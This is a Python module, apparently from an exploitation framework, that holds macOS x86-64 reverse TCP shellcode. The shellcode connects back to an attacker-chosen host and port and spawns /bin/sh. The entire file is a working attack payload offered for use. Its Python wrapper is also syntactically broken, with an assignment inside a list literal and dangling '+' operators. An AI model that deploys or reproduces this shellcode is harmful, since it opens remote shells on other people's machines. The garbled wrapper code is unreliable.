from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Jacob Hammack"
    Shellcode.info["name"] = "OSX64 - reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "https://packetstormsecurity.com/files/100979/Mac-OS-X-Intel-Reverse-TCP-Shell-Shellcode.html",
    ]
    Shellcode.info["size"] = 131

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            shellcode = r"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48" 
            shellcode += r"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F" 
            shellcode += r"\x05\x49\x89\xC4\x49\xBD\x01\x01"
            + kwargs["lport"] +
            +kwargs["host"] +
            shellcode += r"\x41\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89" 
            shellcode += r"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83" 
            shellcode += r"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83" 
            shellcode += r"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48" 
            shellcode += r"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED" 
            shellcode += r"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05"

        ]
